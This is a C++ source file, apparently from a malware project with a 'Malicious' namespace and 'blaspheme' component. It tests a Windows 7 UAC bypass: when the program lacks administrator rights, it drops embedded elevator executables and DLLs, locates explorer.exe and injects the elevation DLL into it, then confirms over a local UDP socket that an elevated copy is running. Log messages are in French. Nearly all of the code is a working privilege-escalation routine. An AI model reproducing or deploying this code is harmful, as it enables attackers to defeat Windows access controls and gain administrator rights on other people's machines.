#include <common/Log.hpp>
#include <malicious/BinaryRessource.hpp>
#include <system/ThisProcess.hpp>
#include <system/System.hpp>
#include <system/Process.hpp>
#include <system/ProcessManager.hpp>
#include <system/File.hpp>
#include <system/Uac.hpp>
#include <blaspheme/Blaspheme.hpp>
using namespace System;
using namespace Malicious;

#include <string>
#include <iostream>
using namespace std;

#include <ElevatorDll32.hpp>
#include <ElevatorDll64.hpp>
#include <Elevator32.hpp>
#include <Elevator64.hpp>

DWORD WINAPI MsgLoop(LPVOID lpParameter)
{
	Network::UdpSocket server;
	server.listen(8000);
	Network::Timeout deadline(0, 100);
	std::string buffer;
	while(true)
	{
		server.recv(buffer, deadline);
		if(buffer.size())
		{
			LOG << buffer;
			if(buffer == "ADMINISTRATOR")
			{
				exit(EXIT_SUCCESS);
			}
		}
	}
	return EXIT_FAILURE;
}

int main()
{
	try
	{
		DWORD dwThread = EXIT_FAILURE;
		HANDLE hThread = 0;
		if(isAdministrator())
		{
			LOG.setHeader("FROM ELEVATED PROCESS");
			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 8000));
			LOG.sendRaw("ADMINISTRATOR");
			return EXIT_SUCCESS;
		}
		else
		{
			LOG.setHeader("TEST ELEVATION");
			LOG.addObserver(new Common::LogToNetwork("127.0.0.1", 80));
			LOG.addObserver(new Common::LogToConsole);
			LOG << "Vous n'etes pas administrateur !";
			hThread = CreateThread(0, 0,(LPTHREAD_START_ROUTINE)MsgLoop, 0, 0, &dwThread);
		}

        switch(getSystemVersion())
	    {
		    case OS_WIN32_WINDOWS_VISTA:
			    if(isUacActivated())
			    {
					LOG << "Elevation non supportee sur Windows Vista.";
					return EXIT_FAILURE;
			    }
			    break;
		    case OS_WIN32_WINDOWS_SEVEN:
			    if(isUacActivated())
			    {
					LOG << "Tentative d'escalade des privileges...";
					BinaryRessource * elevatorDll = 0;
					BinaryRessource * elevator = 0;
					if(is64BitWindows())
					{
						LOG << "Windows 64bit detected";
						elevatorDll = new BinaryRessource(ElevatorDll64, sizeof(ElevatorDll64), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator64, sizeof(Elevator64), ELEVATOR_EXE_NAME, true);
					}
					else
					{
						LOG << "Windows 32bit detected";
						elevatorDll = new BinaryRessource(ElevatorDll32, sizeof(ElevatorDll32), ELEVATOR_DLL_NAME, true);
						elevator = new BinaryRessource(Elevator32, sizeof(Elevator32), ELEVATOR_EXE_NAME, true);
					}

					LOG << "Decouverte du PID d'explorer.exe";
					DWORD explorer_pid = System::ProcessManager::GetPidFromName(ELEVATOR_PROCESS_NAME);
					if(explorer_pid)
					{
						LOG << "Injection de la DLL d'elevation dans explorer.exe : " + to_string(explorer_pid);
					}
					else
					{
						FATAL_ERROR("explorer.exe ne peut pas etre injecte. Le processus n'existe pas.");
					}
    					
                    ThisProcess thisProcess;
                    string currentPath = thisProcess.getProgramDir();
					LOG << "Repertoire courant : "+currentPath;
                    string elevatorArguments = currentPath+"\\"+string(ELEVATOR_PROCESS_NAME) + " " + to_string(explorer_pid) + " " + currentPath+"\\"+string(ELEVATOR_DLL_NAME) + " " + thisProcess.getProgramPath();
					LOG << "Ligne de commande d'elevation " + string(ELEVATOR_EXE_NAME) + " " + elevatorArguments;
    					
					Process elevatorProcess(ELEVATOR_EXE_NAME, elevatorArguments);
					LOG << "Waiting elevator to finish...";
					DWORD exitCode = elevatorProcess.wait();					

					delete elevatorDll;
					delete elevator;
			    }
				break;
			default:
				LOG << "Systeme non pris en charge...";
				return EXIT_FAILURE;
        }

		if(hThread != 0 && !TerminateThread(hThread, 0))
		{
			LOG << "Echec TerminateThread : " + to_string(GetLastError());
		}
		return dwThread;
    }
    catch(std::exception& e)
    {
        LOG << "Exception standard : " + to_string(e.what());
    }
	catch(...)
	{
		LOG << "Erreur d'origine inconnue.";
	}
	return EXIT_FAILURE;
}
